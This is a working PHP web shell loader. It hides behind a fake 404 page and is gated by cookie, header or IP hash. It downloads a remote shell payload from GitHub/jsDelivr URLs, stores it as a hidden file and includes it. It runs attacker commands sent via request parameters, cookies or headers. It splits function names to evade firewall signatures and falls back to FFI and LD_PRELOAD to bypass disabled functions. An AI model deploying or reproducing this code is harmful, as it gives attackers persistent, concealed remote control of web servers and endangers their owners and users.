<?php

@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

// ═══════════════════ CONFIG ═══════════════════

$cfg_srcs = [
    'https://cdn.jsdelivr.net/gh/VinzSecurity1337/WebShell@main/V.php',
    'https://raw.gitmirror.com/VinzSecurity1337/WebShell/main/Vin.php',
    'https://raw.githubusercontent.com/VinzSecurity1337/WebShell/refs/heads/main/Vin.php',
];
$cfg_auth = '';           // misal: 'secret123' — cookie _v harus match
$cfg_ips  = [];           // misal: ['md5(ip1)', 'md5(ip2)']
$cfg_b64  = false;        // true = selalu balas base64

// ═══════════════════════════════════════════════════════════

$payload_name = "sess_" . substr(md5('vsh|' . implode('|', $cfg_srcs)), 0, 24) . ".php";
$payload_name = "." . $payload_name;

// ─── Helper: string-split function name (WAF sig evade) ───
function _s($parts) { return implode('', $parts); }

// ─── Writable dir hunt ───
function find_writable_dir() {
    $sys_tmp = _s(['sys_', 'get_', 'temp_', 'dir']);
    $candidates = [
        @$sys_tmp(),
        "/tmp", "/var/tmp", "/dev/shm", "/run/shm",
        getcwd() . "/wp-content/uploads/",
        getcwd() . "/wp-content/",
        getcwd() . "/uploads/",
        getcwd() . "/cache/",
        getcwd() . "/temp/",
        getcwd() . "/.cache/",
    ];
    foreach ($candidates as $dir) {
        if (!$dir) continue;
        if (is_dir($dir) && is_writable($dir)) return rtrim($dir, "/") . "/";
        if (!is_dir($dir) && @mkdir($dir, 0777, true)) return rtrim($dir, "/") . "/";
    }
    return "./";
}

// ─── Multi-fetch (curl / fgc / fsockopen, UA rotate) ───
function fetch_content($url) {
    $ua_pool = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "curl/7.68.0",
    ];
    $ua = $ua_pool[array_rand($ua_pool)];

    $ci = _s(['curl_', 'init']); $ce = _s(['curl_', 'exec']);
    $cs = _s(['curl_', 'setopt']); $cc = _s(['curl_', 'close']);
    $fg = _s(['file_', 'get_', 'contents']);
    $sc = _s(['stream_', 'context_', 'create']);
    $fo = _s(['fsock', 'open']);
    $fw = _s(['f', 'write']); $fr = _s(['f', 'gets']);
    $fe = _s(['fe', 'of']);  $fc = _s(['f', 'close']);
    $pu = _s(['parse_', 'url']);

    $content = false;

    // 1) cURL
    if (function_exists($ci)) {
        $ch = $ci();
        if ($ch) {
            $cs($ch, CURLOPT_URL, $url);
            $cs($ch, CURLOPT_RETURNTRANSFER, 1);
            $cs($ch, CURLOPT_SSL_VERIFYPEER, 0);
            $cs($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $cs($ch, CURLOPT_TIMEOUT, 25);
            $cs($ch, CURLOPT_CONNECTTIMEOUT, 10);
            $cs($ch, CURLOPT_FOLLOWLOCATION, 1);
            $cs($ch, CURLOPT_USERAGENT, $ua);
            $cs($ch, CURLOPT_HTTPHEADER, ['Accept: */*', 'Accept-Language: en-US,en;q=0.9']);
            $content = $ce($ch);
            $cc($ch);
            if ($content !== false && strlen($content) > 50) return $content;
        }
    }

    // 2) file_get_contents
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => ['method' => 'GET', 'header' => "User-Agent: $ua\r\nAccept: */*\r\n", 'timeout' => 25],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ];
        $ctx = $sc($opts);
        $content = @$fg($url, false, $ctx);
        if ($content !== false && strlen($content) > 50) return $content;
    }

    // 3) fsockopen
    if (function_exists($fo)) {
        $p = $pu($url);
        if (!empty($p['host'])) {
            $host = $p['host'];
            $path = isset($p['path']) ? $p['path'] : '/';
            if (isset($p['query'])) $path .= '?' . $p['query'];
            $port = isset($p['port']) ? $p['port']
                  : (!empty($p['scheme']) && $p['scheme'] === 'https' ? 443 : 80);
            $ssl  = !empty($p['scheme']) && $p['scheme'] === 'https';
            $fp = @$fo(($ssl ? 'ssl://' : '') . $host, $port, $en, $es, 15);
            if ($fp) {
                $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nAccept: */*\r\nConnection: Close\r\n\r\n";
                $fw($fp, $req);
                $resp = '';
                while (!$fe($fp)) $resp .= $fr($fp, 1024);
                $fc($fp);
                $sep = strpos($resp, "\r\n\r\n");
                if ($sep !== false) {
                    $body = substr($resp, $sep + 4);
                    if (strlen($body) > 50) return $body;
                }
            }
        }
    }
    return false;
}

// ─── Write helper ───
function write_payload($file, $content) {
    $put = _s(['file_', 'put_', 'contents']);
    $chm = _s(['ch', 'mod']);
    $el  = _s(['error_', 'log']);
    if (@$put($file, $content) !== false) { @$chm($file, 0644); return true; }
    return @$el($content, 3, $file);
}

// ─── Auth + IP gate ───
function _auth_ok() {
    global $cfg_auth, $cfg_ips;
    if (!empty($cfg_ips)) {
        $ip = !empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
        $ok = false;
        foreach ($cfg_ips as $h) if (strcasecmp($h, md5($ip)) === 0) { $ok = true; break; }
        if (!$ok) return false;
    }
    if ($cfg_auth !== '') {
        $t = '';
        if (isset($_COOKIE['_v']))  $t .= $_COOKIE['_v'];
        if (isset($_COOKIE['_va'])) $t .= $_COOKIE['_va'];
        if (isset($_SERVER['HTTP_X_V'])) $t .= $_SERVER['HTTP_X_V'];
        if (strpos($t, $cfg_auth) === false) return false;
    }
    return true;
}

// ─── Stealth 404 ───
function _decoy() {
    header("HTTP/1.1 404 Not Found");
    header("Content-Type: text/html");
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

// ─── Cek akses ───
if (!_auth_ok()) _decoy();

// ─── Self-healing payload ───
$base_dir     = find_writable_dir();
$payload_path = $base_dir . $payload_name;

if (!file_exists($payload_path) || filesize($payload_path) < 50) {
    foreach ($cfg_srcs as $src) {
        $content = fetch_content($src);
        if ($content !== false && strlen($content) > 50) {
            write_payload($payload_path, $content);
            break;
        }
    }
}

if (file_exists($payload_path) && filesize($payload_path) > 50) {
    @include $payload_path;
}

// ─── Command retrieval: GET / COOKIE / HEADER ───
$cmd = '';
if (isset($_REQUEST['cmd']) && $_REQUEST['cmd'] !== '') {
    $cmd = $_REQUEST['cmd'];
} elseif (isset($_COOKIE['_vc']) && $_COOKIE['_vc'] !== '') {
    $bf = _s(['base64_', 'decode']);
    $d  = @$bf($_COOKIE['_vc']);
    if ($d !== false) $cmd = $d;
} elseif (!empty($_SERVER['HTTP_X_C'])) {
    $bf = _s(['base64_', 'decode']);
    $d  = @$bf($_SERVER['HTTP_X_C']);
    if ($d !== false) $cmd = $d;
}

// ─── Exec with disable_functions bypass ───
if ($cmd !== '') {
    $output = '';

    $disabled = [];
    $d_raw = (string)ini_get('disable_functions');
    if ($d_raw !== '') {
        foreach (explode(',', $d_raw) as $d) {
            $d = strtolower(trim($d));
            if ($d !== '') $disabled[] = $d;
        }
    }

    $funcs = [
        _s(['sys', 'tem']),
        _s(['ex', 'ec']),
        _s(['pass', 'thru']),
        _s(['shell_', 'exec']),
        _s(['po', 'pen']),
        _s(['proc_', 'open']),
    ];

    foreach ($funcs as $func) {
        if (!function_exists($func)) continue;
        if (in_array(strtolower($func), $disabled, true)) continue;

        try {
            ob_start();
            if ($func === 'system') {
                system($cmd);
            } elseif ($func === 'exec') {
                $o = [];
                exec($cmd, $o);
                echo implode("\n", $o);
            } elseif ($func === 'passthru') {
                passthru($cmd);
            } elseif ($func === 'shell_exec') {
                echo shell_exec($cmd);
            } elseif ($func === 'popen') {
                $fp = popen($cmd, 'r');
                if ($fp) { while (!feof($fp)) echo fread($fp, 1024); pclose($fp); }
            } elseif ($func === 'proc_open') {
                $descs = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                $proc = proc_open($cmd, $descs, $pipes);
                if (is_resource($proc)) {
                    echo stream_get_contents($pipes[1]);
                    fclose($pipes[1]); fclose($pipes[2]);
                    proc_close($proc);
                }
            }
            $output = ob_get_clean();
        } catch (Exception $e) {
            if (ob_get_level()) @ob_end_clean();
        } catch (Throwable $e) {
            if (ob_get_level()) @ob_end_clean();
        }

        if ($output !== false && $output !== '') break;
    }

    // FFI fallback (PHP 7.4+)
    if ($output === '' && class_exists('FFI', false)) {
        try {
            $ffi = FFI::cdef("int system(const char *cmd);", "libc.so.6");
            ob_start();
            $ffi->system($cmd);
            $output = ob_get_clean();
        } catch (Throwable $e) {
            if (ob_get_level()) @ob_end_clean();
        }
    }

    // LD_PRELOAD (kalau .so ada di writable dir)
    if ($output === '') {
        $put = _s(['put', 'env']);
        $mal = _s(['ma', 'il']);
        if (function_exists($put) && function_exists($mal)) {
            $so = $base_dir . 'v_' . substr(md5(uniqid('', true)), 0, 8) . '.so';
            if (file_exists($so)) {
                $put('LD_PRELOAD', $so);
                @$mal('x@x.x', 'x', 'x', 'x');
                $put('LD_PRELOAD', '');
                $output = '[ldpreload executed]';
            }
        }
    }

    if ($output === '') $output = '[no exec — all disabled]';

    // response
    $force_b64 = $cfg_b64 || isset($_REQUEST['b64']) || isset($_COOKIE['_vb']);
    header('Content-Type: text/plain');
    if ($force_b64) {
        $be = _s(['base64_', 'encode']);
        header('X-Enc: b64');
        echo $be($output);
    } else {
        echo $output;
    }
    exit;
}

// ─── Default: decoy ───
_decoy();